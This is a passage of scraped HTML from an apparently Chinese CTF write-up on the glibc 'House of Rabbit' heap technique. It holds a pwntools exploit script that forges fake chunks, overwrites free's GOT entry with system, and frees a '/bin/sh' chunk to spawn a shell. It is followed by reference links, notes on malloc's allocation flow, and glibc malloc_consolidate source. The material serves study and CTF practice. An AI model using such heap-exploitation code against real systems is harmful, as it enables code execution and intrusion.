data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'your choice >\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre> </pre></td></tr><tr><td data-num=\"51\"></td><td><pre> </pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\"># 1 0x10</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token comment\"># 2 0x80</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\"># 3 0xA0000</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>nb<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'Add>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'idx>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    se<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre> </pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">,</span>content2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'Edt>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'addr>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    se<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'content>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    se<span class=\"token punctuation\">(</span>content2<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">47</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre> </pre></td></tr><tr><td data-num=\"71\"></td><td><pre> </pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'Del>>'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token number\">0x20</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x601350</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xa00001</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>    <span class=\"token number\">0x00</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xfffffffffffffff0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>    <span class=\"token number\">0x10</span><span class=\"token punctuation\">:</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>pack<span class=\"token punctuation\">(</span><span class=\"token number\">0xfffffffffffffff1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'4'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>debug<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">13337</span><span class=\"token punctuation\">,</span><span class=\"token string\">'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>参考</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucm9kZXJpY2tjaGFuLmNuL3poLWNuLzIwMjMtMDItMjctaG91c2Utb2YtYWxsLWFib3V0LWdsaWJjLWhlYXAtZXhwbG9pdGF0aW9uLyMyNi1ob3VzZS1vZi1yYWJiaXQ=\">https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#26-house-of-rabbit</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hMWV4Lm9ubGluZS8yMDIwLzEwLzE1L0hvdXNlLW9mLVJhYmJpdCVFNSVBRCVBNiVFNCVCOSVBMC8=\">https://a1ex.online/2020/10/15/House-of-Rabbit 学习 /</span></p>\n</blockquote>\n<blockquote>\n<p>增文</p>\n<p>malloc 全流程</p>\n<pre><code>首先是检查是否满足fastbin大小要求，满足且存在适合的chunk就从fastbin中分配\n\n然后检查是否满足smallbin，满足且存在适合的chunk就从smallbin中分配\n\n同时检查是否满足largebin，满足就计算一下所属的largebin的索引idx\n\n进行unsortedbin的处理过程，从后向前遍历unsortedbin链表，满足切割分配就切割分配，大小精确匹配就分配，大小不匹配的就根据大小装入largebin和smallbin\n\n注意：这里会检查申请大小是否超出系统内存！这是该版本malloc中唯一检查的地方，如果没有unsortedbin，就不进行检查\nunsortedbin处理完之后，从largebin中找满足大小要求的chunk分配，要么直接分配出去，要么切割分配出去，剩下的部分装入unsortedbin\n\nlargebin中最大的chunk范围是0x80000 - ∞\n从largebin中分配不检查申请大小是否超出系统内存\n最后在从top chunk分配，分配不了就用sysmalloc去映射内存或者扩大top chunk\n</code></pre>\n</blockquote>\n<blockquote>\n<p><code>malloc_consolidate</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">malloc_consolidate</span><span class=\"token punctuation\">(</span>mstate av<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> mfastbinptr<span class=\"token operator\">*</span>    fb<span class=\"token punctuation\">;</span>                 <span class=\"token comment\">/* current fastbin being consolidated */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> mfastbinptr<span class=\"token operator\">*</span>    maxfb<span class=\"token punctuation\">;</span>              <span class=\"token comment\">/* last fastbin (for loop control) */</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> mchunkptr       p<span class=\"token punctuation\">;</span>                  <span class=\"token comment\">/* current chunk being consolidated */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> mchunkptr       nextp<span class=\"token punctuation\">;</span>              <span class=\"token comment\">/* next chunk to consolidate */</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> mchunkptr       unsorted_bin<span class=\"token punctuation\">;</span>       <span class=\"token comment\">/* bin header */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> mchunkptr       first_unsorted<span class=\"token punctuation\">;</span>     <span class=\"token comment\">/* chunk to link to */</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token comment\">/* These have same use as in free() */</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> mchunkptr       nextchunk<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> INTERNAL_SIZE_T size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> INTERNAL_SIZE_T nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> INTERNAL_SIZE_T prevsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre> <span class=\"token keyword\">int</span>             nextinuse<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre> mchunkptr       bck<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre> mchunkptr       fwd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre> <span class=\"token function\">atomic_store_relaxed</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>av<span class=\"token operator\">-></span>have_fastchunks<span class=\"token punctuation\">,</span> false<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre> unsorted_bin <span class=\"token operator\">=</span> <span class=\"token function\">unsorted_chunks</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre> <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>   Remove each chunk from fast bin and consolidate it, placing it</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>   then in unsorted bin. Among other reasons for doing this,</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>   placing in unsorted bin avoids needing to calculate actual bins</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>   until malloc is sure that chunks aren't immediately going to be</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>   reused anyway.</pre></td></tr><tr><td data-num=\"29\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre> maxfb <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token function\">fastbin</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> NFASTBINS <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre> fb <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token function\">fastbin</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre> <span class=\"token keyword\">do</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>   p <span class=\"token operator\">=</span> <span class=\"token function\">atomic_exchange_acq</span> <span class=\"token punctuation\">(</span>fb<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>     <span class=\"token keyword\">do</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> idx <span class=\"token operator\">=</span> <span class=\"token function\">fastbin_index</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunksize</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token function\">fastbin</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> fb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t    <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"malloc_consolidate(): invalid chunk size\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token function\">check_inuse_chunk</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\tnextp <span class=\"token operator\">=</span> p<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t<span class=\"token comment\">/* Slightly streamlined version of consolidation code in free() */</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\tsize <span class=\"token operator\">=</span> <span class=\"token function\">chunksize</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\tnextchunk <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>\tnextsize <span class=\"token operator\">=</span> <span class=\"token function\">chunksize</span><span class=\"token punctuation\">(</span>nextchunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">prev_inuse</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t  prevsize <span class=\"token operator\">=</span> <span class=\"token function\">prev_size</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t  size <span class=\"token operator\">+=</span> prevsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t  p <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> prevsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t  <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> bck<span class=\"token punctuation\">,</span> fwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>nextchunk <span class=\"token operator\">!=</span> av<span class=\"token operator\">-></span>top<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t  nextinuse <span class=\"token operator\">=</span> <span class=\"token function\">inuse_bit_at_offset</span><span class=\"token punctuation\">(</span>nextchunk<span class=\"token punctuation\">,</span> nextsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>nextinuse<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t    size <span class=\"token operator\">+=</span> nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t    <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> nextchunk<span class=\"token punctuation\">,</span> bck<span class=\"token punctuation\">,</span> fwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>\t  <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t    <span class=\"token function\">clear_inuse_bit_at_offset</span><span class=\"token punctuation\">(</span>nextchunk<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t  first_unsorted <span class=\"token operator\">=</span> unsorted_bin<span class=\"token operator\">-></span>fd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t  unsorted_bin<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t  first_unsorted<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>\t  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">in_smallbin_range</span> <span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\t    p<span class=\"token operator\">-></span>fd_nextsize <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\t    p<span class=\"token operator\">-></span>bk_nextsize <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>\t  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>\t  <span class=\"token function\">set_head</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size <span class=\"token operator\">|</span> PREV_INUSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t  p<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> unsorted_bin<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\t  p<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> first_unsorted<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t  <span class=\"token function\">set_foot</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t<span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>\t  size <span class=\"token operator\">+=</span> nextsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>\t  <span class=\"token function\">set_head</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size <span class=\"token operator\">|</span> PREV_INUSE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>\t  av<span class=\"token operator\">-></span>top <span class=\"token operator\">=</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>     <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span> <span class=\"token 